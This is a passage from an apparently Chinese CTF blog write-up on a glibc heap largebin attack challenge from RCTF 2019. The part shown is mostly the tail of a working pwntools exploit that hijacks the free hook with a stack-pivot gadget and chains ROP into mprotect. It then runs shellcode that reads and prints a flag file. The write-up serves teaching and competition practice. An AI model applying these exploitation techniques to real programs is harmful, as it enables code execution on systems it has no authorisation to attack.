class="number">0x48</span>) <span class="comment">#4 calloc from free_hook-0x20</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'a'</span>*<span class="number">0x10</span>+p64(libc_base + <span class="number">0x47b75</span>)) <span class="comment">#mov rsp,[rdi+0xa0];mov rcx,[rdi+0xa8];push rcx</span></span><br><span class="line"><span class="comment">##rsp:chunk 11's data start</span></span><br><span class="line"><span class="comment">##rcx:retn</span></span><br><span class="line"><span class="comment">##retn chunk 11's data start</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##0x0000000000021102 : pop rdi ; ret</span></span><br><span class="line">rop = p64(libc_base +<span class="number">0x0000000000021102</span>) + p64(heap_base) <span class="comment">#rdi = heap_base</span></span><br><span class="line"><span class="comment">##0x00000000001150c9 : pop rdx ; pop rsi ; ret</span></span><br><span class="line"><span class="comment">##rdx= 7 rsi = 0x2000 retn mprotect</span></span><br><span class="line"><span class="comment">##mprotect(heap_base,0x2000,0x7) heap_base~heap_base+0x2000:(rw-p)-&gt;(rwxp)</span></span><br><span class="line">rop+= p64(libc_base +<span class="number">0x00000000001150c9</span>) + p64(<span class="number">7</span>) + p64(<span class="number">0x2000</span>) + p64(libc_base+libc.symbols[<span class="string">"mprotect"</span>]) <span class="comment">#length:0x48</span></span><br><span class="line"><span class="comment">##retn shellcode</span></span><br><span class="line">rop+= p64(heap_base+<span class="number">0x48</span>+<span class="number">0xc20</span>) <span class="comment">#heap_base+0xc20:chunk 11</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##.string "./flag":push "./flag"</span></span><br><span class="line"><span class="comment">##open("./flag",0)</span></span><br><span class="line"><span class="comment">##read(fd,heap_base+0x48+0xc20,0x100)</span></span><br><span class="line"><span class="comment">##write(1,heap_base+0x48+0xc20,0x100)</span></span><br><span class="line"><span class="comment">##exit()</span></span><br><span class="line">code = <span class="string">"""</span></span><br><span class="line"><span class="string">       xor rsi,rsi</span></span><br><span class="line"><span class="string">       mov rax,SYS_open</span></span><br><span class="line"><span class="string">       call here</span></span><br><span class="line"><span class="string">       .string "./flag"</span></span><br><span class="line"><span class="string">       here:</span></span><br><span class="line"><span class="string">       pop rdi</span></span><br><span class="line"><span class="string">       syscall</span></span><br><span class="line"><span class="string">       mov rdi,rax</span></span><br><span class="line"><span class="string">       mov rsi,rsp</span></span><br><span class="line"><span class="string">       mov rdx,0x100</span></span><br><span class="line"><span class="string">       mov rax,SYS_read</span></span><br><span class="line"><span class="string">       syscall</span></span><br><span class="line"><span class="string">       mov rdi,1</span></span><br><span class="line"><span class="string">       mov rsi,rsp</span></span><br><span class="line"><span class="string">       mov rdx,0x100</span></span><br><span class="line"><span class="string">       mov rax,SYS_write</span></span><br><span class="line"><span class="string">       syscall</span></span><br><span class="line"><span class="string">       mov rax,SYS_exit</span></span><br><span class="line"><span class="string">       syscall</span></span><br><span class="line"><span class="string">       """</span></span><br><span class="line">shellcode = asm(code,arch=<span class="string">"amd64"</span>)</span><br><span class="line">rop += shellcode</span><br><span class="line">edit(<span class="number">11</span>,rop)</span><br><span class="line"><span class="comment">##[rdi+0xa0]:chunk 11's data start</span></span><br><span class="line"><span class="comment">##[rdi+0xa8]:retn</span></span><br><span class="line">edit(<span class="number">10</span>,<span class="string">'a'</span>*<span class="number">0xa0</span>+p64(heap_base+<span class="number">0x10</span>+<span class="number">0xc20</span>)+p64(<span class="number">0x209b5</span>+libc_base))</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.rois.io/2019/rctf-2019-official-writeup/" target="_blank" rel="noopener">https://blog.rois.io/2019/rctf-2019-official-writeup/</a></p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/pwn/" rel="tag"># pwn</a>
          
            <a href="/tags/CTF/" rel="tag"># CTF</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/05/23/TSCTF2019-pwn-一/" rel="next" title="TSCTF2019 pwn(一)">
                <i class="fa fa-chevron-left"></i> TSCTF2019 pwn(一)
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/05/31/TSCTF-2019-babyheap/" rel="prev" title="TSCTF 2019 babyheap">
                TSCTF 2019 babyheap <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name"></p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">42</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">11</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#largebin-attack"><span class="nav-number">1.</span> <span class="nav-text">largebin attack</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#题目简述-amp-题目漏洞"><span class="nav-number">2.</span> <span class="nav-text">题目简述 &amp; 题目漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用过程"><span class="nav-number">3.</span> <span class="nav-text">利用过程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#泄露libc和heap基址"><span class="nav-number">3.1.</span> <span class="nav-text">泄露libc和heap基址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#largebin-attack-1"><span class="nav-number">3.2.</span> <span class="nav-text">largebin attack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#劫持控制流"><span class="nav-number">3.3.</span> <span class="nav-text">劫持控制流</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder"></span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
